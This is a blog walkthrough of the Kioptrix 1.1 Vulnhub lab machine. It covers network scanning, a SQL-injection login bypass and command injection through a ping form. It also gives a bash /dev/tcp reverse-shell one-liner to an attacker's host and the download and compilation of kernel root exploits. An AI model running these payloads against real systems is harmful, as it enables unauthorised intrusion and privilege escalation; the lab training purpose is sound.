<h1>Kioptrix 2 walkthrough (Vulnhub)</h1>

<!-- wp:paragraph -->
<p>Hello my fellow hackers! Today we are going to do the <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/" target="_blank">Kioptrix 1.1 (#2)</a> machine from vulnhub. I am assuming that you have already set it up on virtual box/vmware or any other virtual environment and it's running. If you haven't done it yet, I will recommend you to search Google to do that.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>First of all, before testing anything, we must be knowing the IP of the target machine. To obtain that, we need to use the <strong>Netdiscover</strong> tool. The netdiscover tool can scan IP range for connected hosts. I have used class C addresses for my host and guest machines, so the IP will be of the form  192.168.xx.xx</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>To pass the IP range/network IP to netdiscover, we can use <strong>-r</strong> option.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code># netdiscover -r 192.168.43.0/24</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":78} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-23.png" alt="" class="wp-image-78"/><figcaption>Output of netdiscover command</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>As you can see that it listed two connected devices. First one belongs to the router itself while the second one is of the target system. I have hidden the MAC addresses for security reasons.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Now we have got the IP of the target system, now it's time for enumeration. We will do an nmap scan for port scanning. I used the following command for port scanning through nmap.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code># nmap -sS -sC -sV  -A -p- 192.168.43.239 -oN nmap.txt</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>It requires a bit explanation! The <strong>-sS</strong> flag is used for <strong>TCP SYN scan</strong>. <strong>-sC</strong> is used for using <strong>default NSE scripts</strong>, <strong>-sV</strong> is used for <strong>version detection</strong>, <strong>-A </strong>for <strong>banner grabbing</strong>, <strong>-p- </strong>for <strong>scanning all ports</strong>. Following our target IP, the last flag <strong>-oN </strong> is for <strong>output in normal text form</strong> and the file name is supplied as an argument to the flag. I have marked the ports with red color</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre class="wp-block-code"><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-23 06:20 EDT
Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.79% done; ETC: 06:21 (0:00:00 remaining)
Nmap scan report for 192.168.43.239
Host is up (0.00019s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
<b style="color:red;">22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)</b>
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
<b style="color:red;">80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))</b>
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
<b style="color:red;">111/tcp  open  rpcbind    2 (RPC #100000)</b>
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            600/udp  status
|_  100024  1            603/tcp  status
<b style="color:red;">443/tcp  open  ssl/https?</b>
|_ssl-date: 2019-05-23T14:20:51+00:00; +3h59m58s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
<b style="color:red;">603/tcp  open  status     1 (RPC #100024)</b>
<b style="color:red;">631/tcp  open  ipp        CUPS 1.1</b>
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
<b style="color:red;">3306/tcp open  mysql      MySQL (unauthorized)</b>
MAC Address: 08:00:27:9E:70:47 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: 3h59m57s, deviation: 0s, median: 3h59m57s

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms 192.168.43.239

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.49 seconds
</code></pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>No matter what the open ports are, it is always a good approach to look at the port 80(or I should say, the main web page). So let's jump to the webpage. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>When you visit the main page, it will greet you with this authentication form.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":85,"width":709,"height":310} -->
<figure class="wp-block-image is-resized"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-25.png" alt="" class="wp-image-85" width="709" height="310"/><figcaption>authentication form on the main webpage</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After making a lot of failed attempts trying to log in with silly credentials like "admin:pass", I decided to test it for SQL injection. Luckily, that was present there. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":89,"width":711,"height":300} -->
<figure class="wp-block-image is-resized"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-27.png" alt="" class="wp-image-89" width="711" height="300"/><figcaption>trying basic SQL injection on form</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Now the payload(malicious input) I gave requires a bit explanation. What this payload is doing is that it first closes the previous query using a single quote(<strong>'</strong>). Once that query is closed we give such a query as input that will always result in "True". Here, that query is <strong>'1=1'</strong>. It's a common sense that <strong>1 is equal to 1</strong> will always yield to "True" result. Isn't it? <br>That <strong>or</strong> is placed between the two queries so that the whole query can evaluate to "True" if there is at least one query among both which yields "True". As we know '1=1' will always yield to "True", hence the whole query will always evaluate to <strong>True</strong> no matter what. That <strong>#(hash) </strong>sign is used for specifying a comment. This sign has a special meaning in SQL. It is used for writing comments. Hence, here, whatever query will be there after it, It will be ignored due to the presence of <strong>#</strong> before them. This will lead to the entire SQL authentication process yielding to <strong>True </strong>and we will logged in.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After the authentication process is now complete, we are presented with the following on the next page.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":90,"width":723,"height":98} -->
<figure class="wp-block-image is-resized"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-28.png" alt="" class="wp-image-90" width="723" height="98"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>As this page says, we can ping whatever IP we want from here. Let's first test it with localhost IP.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":92,"width":730,"height":91} -->
<figure class="wp-block-image is-resized"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-30.png" alt="" class="wp-image-92" width="730" height="91"/><figcaption>testing ping box for localhost IP</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It produced the following output on a new tab:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":93,"width":728,"height":240} -->
<figure class="wp-block-image is-resized"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-31.png" alt="" class="wp-image-93" width="728" height="240"/><figcaption>output of ping box for localhost IP</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It works! But the output looks familiar. That's what the output of <strong>ping -c 3 127.0.0.1</strong> looks like. Don't believe me? See for yourself:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":97} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-33.png" alt="" class="wp-image-97"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>What can you derive from this behavior of that "ping box"? It is that it is using a syntax which looks like this from inside:</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre class="wp-block-code"><code>$ ping -c 3 <i style="color:red;">&lt;entered_IP_address&gt;</i></code></pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>That &lt;entered_IP_address&gt; is controlled by us. That means we could somehow manipulate the command execution by passing some specially crafted payload(malicious input). What if I pass this in place of IP address.</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
$ ping -c 3 <b style="color:red;">127.0.0.1; whoami</b>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>According to this approach, first the ping tool will ping the localhost address. But the <strong>whoami</strong> will be executed as an independent command due to that semicolon(;) placed before it which will end the previous command.<br>Let's test this payload in the "ping box".</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":99,"width":674,"height":89} -->
<figure class="wp-block-image is-resized"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-34.png" alt="" class="wp-image-99" width="674" height="89"/><figcaption>testing the payload</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":101} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-36.png" alt="" class="wp-image-101"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Did you notice something? If not, then look at the last line of the output highlighted with red box. That <strong>whoami </strong>command we gave actually got executed. Yay, that means we have arbitrary code injection. Now the first thing an attacker generally does after discovering such a command injection vulnerability is to try to get a reverse shell using netcat. I tried the same but it didn't helped. The reason behind that was <strong>either the netcat isn't installed on the target system </strong>or <strong>the current user(apache) does not have permission to execute it</strong>. So we have to look somewhere else. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>So I set up a netcat server listening on my attack machine and executed this command in the ping box for getting a reverse shell. I got this from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
bash -i &gt;&amp; /dev/tcp/<i style="color:red;">attacker's_IP<b>/</b>port_no</i> 0&gt;&amp;1
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I placed my attack machine's IP in place of <em>attacker's_IP </em>and desired<em> </em>port in place of <em>port_no</em> so that It can connect to my host. But before executing it, I had to create a netcat server to receive that connection and get a reverse shell.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":104,"width":674,"height":99} -->
<figure class="wp-block-image is-resized"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-38.png" alt="" class="wp-image-104" width="674" height="99"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":105} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-39.png" alt="" class="wp-image-105"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We got a shell! Yay!</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Now it's time for privilege escalation. Let's see some information about the operating system and kernel. We can do this by using the command <strong>uname </strong>or <strong>lsb_release</strong>. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":106} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-40.png" alt="" class="wp-image-106"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I want you to notice few things in the output. The first is that it's using <strong>Linux kernel 2.6.X</strong> and The operating system it operates on is <strong>CentOS 4.5</strong>. <br>Now If you are an experienced pentester, you might be aware of that Linux kernels 2.6.X are vulnerable to <strong>Dirty Cow exploit</strong>. After trying couple of Dirty Cow exploits, I discovered that this vulnerability has been already patched by the maker of the box. So we can't use dirty cow exploit here. But we can use that CentOS version information to find exploits related to it.<br>Let's google!</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":107} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-41.png" alt="" class="wp-image-107"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's download this exploit in vulnerable machine and compile it. To download it on victim machine, I used the <strong>wget </strong>tool. </p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bash-3.00$ wget --no-check-certificate https://www.exploit-db.com/download/9542</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>That <strong>--no-check-certificate </strong>is used to deal with SSL certificate exchange issue. Sometimes this command doesn't work as intended. In that case, simple copy the exploit code from the website and create a file in vicitim OS, paste the code there and compile it manually. <br>But, while doing so, you will find that you don't have write permissions on the directory. Then how to create a file? Here, you can use the <strong>/tmp</strong> directory as it is writable for all. Just navigate to /tmp and create the file.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Once the exploit code file is there, compile it using the following command:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bash-3.00$ gcc 9542.c -o exploit</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>What this command does is that It gives instruction to <strong>GCC(GNU C Compiler) </strong>to compile the code and generate an executable file named <strong>exploit</strong>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Now the code is compiled and it's showtime. Let's fire up our exploit and see if we get root or not.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bash-3.00$ ./exploit</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":108} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-42.png" alt="" class="wp-image-108"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Hurrey!<br>"Alright Jack, I have gained root access to the remote system!"</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Wait wait wait! There is another exploit which we can use here to get root. Remember what kernel version was that?</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let's find some exploits for it other than Dirty Cow. I will use <strong>searchsploit </strong>exploit finder tool for that.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code># searchsploit Linux kernel 2.6</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>After running this command, I found a lot of exploits related to this kernel version.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":109} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-43.png" alt="" class="wp-image-109"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I found the highlighted one more interesting as <strong>CentOS</strong>(which is our target host) is explicitly written there in the name of exploit. That means it must be compatible with CentOS machines. There's nothing bad in giving it a try. Let's download it and put this exploit code into vicitim machine(I have already told you how to do that). </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>To download an exploit code from <strong>searchsploit</strong>, simply use the mirror flag (<strong>-m</strong>) which mirrors the exploit code into the current directory.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code># searchsploit -m exploits/linux/local/9545.c</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":111} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-45.png" alt="" class="wp-image-111"/><figcaption><br></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After downloading and uploading the exploit code into victim machine, open the file and check the comments for compilation instructions. It is mentioned there that we need to use an extra flag <strong>-Wall </strong>during the compilation for the correct working of exploit.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bash-3.00$ gcc -Wall linux-sendpage.c -o linux-sendpage</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Now everything is set, let's launch the exploit!</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bash-3.00$ ./linux-sendpage</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":112} -->
<figure class="wp-block-image"><img src="https://hackersfoodhome.files.wordpress.com/2019/05/image-46.png" alt="" class="wp-image-112"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>And here it is! We are root! </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I won't show flags so that you guys can try this box to find that out. Thanks for giving it a read! <br>Happy Hacking! </p>
<!-- /wp:paragraph -->
